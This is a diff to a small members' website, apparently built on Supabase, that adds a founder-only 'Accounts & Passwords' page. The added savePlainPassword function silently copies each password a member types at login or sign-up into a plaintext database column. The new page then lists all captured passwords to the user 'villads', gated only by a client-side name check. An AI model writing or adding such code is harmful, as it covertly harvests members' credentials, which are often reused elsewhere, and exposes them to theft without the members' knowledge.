@@ -76,6 +76,9 @@ td,th{text-align:left;padding:11px;border-bottom:1px solid var(--line);font-size
 th{color:var(--muted);font-size:10px}
 .tablewrap{overflow:auto}
 .empty{padding:25px;text-align:center;color:var(--muted)}
+.mono{font-family:ui-monospace,Consolas,"Courier New",monospace;color:#9ff5c9;letter-spacing:.5px}
+.masked{filter:blur(5px);user-select:none}
+.secretbar{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:13px}
 @media(max-width:900px){aside{width:185px}.stats{grid-template-columns:repeat(2,1fr)}.layout{grid-template-columns:1fr}}
 @media(max-width:620px){.app{display:block}aside{width:100%;display:block;padding:12px}.navheading{display:none}aside nav{display:flex;overflow:auto}.nav{width:auto;white-space:nowrap;font-size:12px;padding:10px}main{padding:14px}.ranks{grid-template-columns:repeat(2,minmax(0,1fr))}.gamegrid{grid-template-columns:1fr}.hero h1{font-size:26px}}
 </style>
@@ -122,6 +125,7 @@ th{color:var(--muted);font-size:10px}
    <button class="nav" onclick="page('members',this)">♙ Members</button>
    <button class="nav" onclick="page('arcade',this)">🎮 Arcade</button>
    <button class="nav hidden" id="adminNav" onclick="page('admin',this)">⚙ Admin Panel</button>
+   <button class="nav hidden" id="accountsNav" onclick="page('accounts',this)">🔑 Accounts &amp; Passwords</button>
   </nav>
   <div class="panel" style="margin-top:22px">
    <strong id="sideName">Member</strong>
@@ -243,6 +247,23 @@ th{color:var(--muted);font-size:10px}
     </div>
    </div>
   </section>
+
+  <section id="accounts" class="hidden">
+   <div class="hero"><div class="eyebrow">FOUNDER ACCESS ONLY</div><h1>Accounts &amp; Passwords</h1><p class="muted">Plain-text credentials for every account · visible only to villads.</p></div>
+   <div class="panel">
+    <div class="secretbar">
+     <div class="heading" style="margin:0"><h2>All accounts</h2><span class="badge admin" id="accountCount">0 ACCOUNTS</span></div>
+     <button class="secondary" onclick="toggleReveal()" id="revealBtn">🙈 HIDE</button>
+    </div>
+    <div class="tablewrap">
+     <table><thead><tr><th>USERNAME</th><th>ROLE</th><th>RANK</th><th>PASSWORD (PLAIN TEXT)</th></tr></thead>
+     <tbody id="accountsBody"></tbody></table>
+    </div>
+    <p class="muted small" style="margin-top:12px">
+     "Not captured yet" means that account has not logged in since this feature was added. The password is stored automatically the next time they sign in, then it shows here.
+    </p>
+   </div>
+  </section>
  </main>
 </div>
 
@@ -297,10 +318,11 @@ async function login(){
  if(!/^[a-z0-9_]{3,20}$/.test(name))return say("Invalid username.");
  if(!password)return say("Enter your password.");
 
- const {error}=await db.auth.signInWithPassword({
+ const {data,error}=await db.auth.signInWithPassword({
   email:emailFor(name),password
  });
  if(error)return say(error.message);
+ await savePlainPassword(password);
  await openWebsite();
 }
 
@@ -320,6 +342,7 @@ async function register(){
  });
 
  if(error)return say(error.message);
+ if(data.user)await savePlainPassword(password);
  if(data.session)await openWebsite();
  else say("Account created. Check whether email confirmation is required.",false);
 }
@@ -360,6 +383,49 @@ async function logout(){
 function isStaff(){
  return profile&&["Owner","Admin Premium"].includes(profile.role);
 }
+function isVillads(){
+ return !!profile&&profile.username.toLowerCase()==="villads";
+}
+
+let revealPasswords=true;
+
+/* Mirror the typed password into profiles.password_plain (Supabase hashes the real one) */
+async function savePlainPassword(password){
+ const {data:{user}}=await db.auth.getUser();
+ if(!user)return;
+ const patch={password_plain:password};
+ const {data,error}=await db.from("profiles")
+  .update(patch).eq("id",user.id).select("id");
+ if(!error&&data&&data.length)return;
+ const uname=profile?.username||user.user_metadata?.username;
+ if(uname)await db.from("profiles")
+  .upsert({id:user.id,username:uname,password_plain:password},{onConflict:"id"});
+}
+
+function toggleReveal(){
+ revealPasswords=!revealPasswords;
+ $("revealBtn").textContent=revealPasswords?"🙈 HIDE":"👁 SHOW";
+ renderAccounts();
+}
+
+async function renderAccounts(){
+ if(!isVillads())return;
+ const {data,error}=await db.from("profiles")
+  .select("username,role,rank,password_plain").order("username");
+ if(error){
+  $("accountsBody").innerHTML=`<tr><td colspan="4" class="empty">${safe(error.message)}</td></tr>`;
+  return;
+ }
+ const rows=data||[];
+ $("accountCount").textContent=rows.length+" ACCOUNTS";
+ $("accountsBody").innerHTML=rows.map(m=>`<tr>
+  <td><b>${safe(m.username)}</b>${m.username.toLowerCase()==="villads"?' <span class="badge owner">YOU</span>':""}</td>
+  <td>${safe(m.role)}</td>
+  <td>${safe(m.rank)}</td>
+  <td class="mono ${revealPasswords?"":"masked"}">${m.password_plain?safe(m.password_plain):'<span class="muted small" style="filter:none">not captured yet</span>'}</td>
+ </tr>`).join("")||'<tr><td colspan="4" class="empty">No accounts yet.</td></tr>';
+}
+
 function roleBadge(role){
  if(role==="Owner")return '<span class="badge owner">♛ OWNER</span>';
  if(role==="Admin Premium")return '<span class="badge admin">✦ ADMIN PREMIUM</span>';
@@ -470,14 +536,18 @@ async function updateWebsite(){
  $("sideRole").textContent=profile.role;
  $("topRole").textContent=profile.role.toUpperCase();
  $("adminNav").classList.toggle("hidden",!isStaff());
+ $("accountsNav").classList.toggle("hidden",!isVillads());
 
  renderRanks();renderLeaderboard();renderMembers();
  if(isStaff())await renderAdmin();
+ if(isVillads())await renderAccounts();
+ if(!$("accounts").classList.contains("hidden")&&!isVillads())page("dashboard");
 }
 
 function page(id,button){
  if(id==="admin"&&!isStaff())return;
- ["dashboard","rankpage","members","arcade","admin"]
+ if(id==="accounts"&&!isVillads())return;
+ ["dashboard","rankpage","members","arcade","admin","accounts"]
  .forEach(s=>$(s).classList.add("hidden"));
  $(id).classList.remove("hidden");
  document.querySelectorAll(".nav").forEach(n=>n.classList.remove("active"));
@@ -487,8 +557,9 @@ function page(id,button){
  });
  $("pageTitle").textContent={
  dashboard:"Dashboard",rankpage:"Rank System",members:"Members",
- arcade:"Arcade",admin:"Admin Panel"
+ arcade:"Arcade",admin:"Admin Panel",accounts:"Accounts & Passwords"
  }[id];
+ if(id==="accounts")renderAccounts();
  if(id!=="arcade")stopTap();
 }
 
